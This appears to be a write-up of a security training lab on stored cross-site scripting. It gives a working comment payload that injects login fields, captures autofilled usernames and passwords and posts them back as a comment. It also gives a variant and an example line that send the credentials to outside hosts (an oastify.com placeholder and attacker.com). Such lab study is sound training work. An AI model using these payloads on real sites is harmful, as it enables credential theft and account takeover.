# Exploiting Cross-Site Scripting to Capture Passwords (Without Burp Collaborator)

## Lab Overview
**Difficulty:** Practitioner  
**Vulnerability Type:** Stored XSS  
**Objective:** Exfiltrate victim's username and password, then log in to their account  
**Status:** ✅ Solved

---

## The Challenge
The lab contains a stored XSS vulnerability in blog comments. The goal is to capture the victim's credentials when they view the comments—without using Burp Collaborator for exfiltration.

---

## The Alternative Solution
Instead of exfiltrating credentials to an external server, we inject HTML input fields that capture autofilled credentials and **post them back as a comment** on the same blog.

---

## Working Payload (Comment Field)

```html
<input type="text" name="username">
<input type="password" name="password" onchange="dothis()">

<script>
function dothis() {
var username = document.getElementsByName('username')[0].value
var password = document.getElementsByName('password')[0].value
var token = document.getElementsByName('csrf')[0].value
var data = new FormData();

data.append('csrf', token);
data.append('postId', 2);
data.append('comment', `${username}:${password}`);
data.append('name', 'victim');
data.append('email', 'victim@example.com');
data.append('website', 'http://example.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
};
</script>
```

**Important:** Change `postId` value (line 11) to match your blog post ID (visible in the URL).

---

## How It Works

### Step 1: Payload Creates Input Fields
The `<input>` tags create username and password fields in the comment section.

### Step 2: Browser Autofills Credentials
When the victim's browser loads the page, it **automatically fills** the username and password fields (if autofill is enabled).

### Step 3: onchange Event Triggers
When the password field is populated (autofilled), the `onchange="dothis()"` event fires.

### Step 4: Function Captures Values
The `dothis()` function:
- Reads the autofilled username and password
- Extracts the CSRF token from the page
- Creates a FormData object

### Step 5: Credentials Posted as Comment
The function uses `fetch()` to POST a new comment containing:
```
username:password
```

### Step 6: Attacker Reads Credentials
- Refresh the blog post
- Look for the new comment with the format `username:password`
- Use those credentials to log in

---

## Step-by-Step Exploitation

### 1. Find the Post ID
Navigate to any blog post and check the URL:
```
/post?postId=2
```
Note the `postId` value (e.g., `2`).

### 2. Update the Payload
Change line 11 in the payload:
```javascript
data.append('postId', 2);  // Change to your postId
```

### 3. Post the Comment
- Paste the payload into the **Comment** textarea
- Fill in Name, Email, Website (any values)
- Click **Post Comment**

### 4. Wait for Victim
The lab simulates a victim viewing the comments. Their browser will:
- Load the page
- Autofill the injected input fields
- Trigger the `onchange` event
- Post their credentials as a comment

### 5. Retrieve Credentials
- Click **Back to Blog**
- Scroll to the comments section
- Look for a new comment with format: `administrator:password123`

### 6. Log In
- Click **My account** at the top
- Enter the captured credentials
- Click **Log in**
- Lab solved! ✅

---

## Key Concepts

### Browser Autofill Behavior
Modern browsers automatically fill saved credentials when they detect username/password fields. This payload exploits that feature.

### Same-Origin Policy Bypass
Since we're posting the comment **back to the same origin** (the blog itself), we don't need external exfiltration or Burp Collaborator.

### CSRF Token Extraction
```javascript
var token = document.getElementsByName('csrf')[0].value
```
Extracts the CSRF token from the page to make a valid POST request.

### Template Literals
```javascript
data.append('comment', `${username}:${password}`);
```
Uses **backticks** (`) and `${}` syntax to embed variables in strings.

---

## Why This Works Without Collaborator

Traditional exfiltration sends data to an external server:
```javascript
fetch('http://attacker.com/?creds=' + username)  // Blocked by lab firewall
```

This solution posts data **within the same application**:
```javascript
fetch('/post/comment', { ... })  // Same origin, allowed
```

The lab's firewall blocks external requests, but same-origin requests are permitted.

---

## Troubleshooting

### No credentials appear
- Ensure `postId` matches the blog post URL
- Wait a few seconds and refresh the page
- Check if victim has autofill enabled (lab simulates this)

### Payload doesn't execute
- Verify all HTML tags are properly closed
- Check for syntax errors in JavaScript
- Ensure backticks (`) are used, not single quotes (')

### CSRF token error
- Token is extracted automatically from the page
- If POST fails, check browser console for errors

---

## Alternative: Using Burp Collaborator

If you have Burp Suite, you can use the Collaborator for cleaner exfiltration:

```html
<input type="text" name="username">
<input type="password" name="password" onchange="exfil()">

<script>
function exfil() {
var u = document.getElementsByName('username')[0].value;
var p = document.getElementsByName('password')[0].value;
fetch('http://YOUR-ID.oastify.com/?c=' + encodeURIComponent(u + ':' + p));
};
</script>
```

Then check Burp Collaborator for incoming requests with credentials.

---

## Key Takeaways

✅ **Stored XSS** allows persistent payloads that affect all viewers  
✅ **Autofill exploitation** captures credentials without user interaction  
✅ **Same-origin requests** bypass external firewall restrictions  
✅ **Template literals** (`${}`) embed variables in strings  
✅ **CSRF tokens** can be extracted client-side for valid requests  
✅ **Alternative to Collaborator** uses the application itself for exfiltration  

---

## References
- [Marduk I Am - Exploiting XSS to Capture Passwords](https://medium.com/@marduk_i_am/exploiting-cross-site-scripting-to-capture-passwords-8f2e2f02f571)
- [PortSwigger: Exploiting XSS](https://portswigger.net/web-security/cross-site-scripting/exploiting)

---

**Date Completed:** February 3, 2026  
**Payload Type:** Stored XSS with autofill exploitation and same-origin exfiltration  
**Key Technique:** Inject input fields → capture autofilled credentials → post as comment
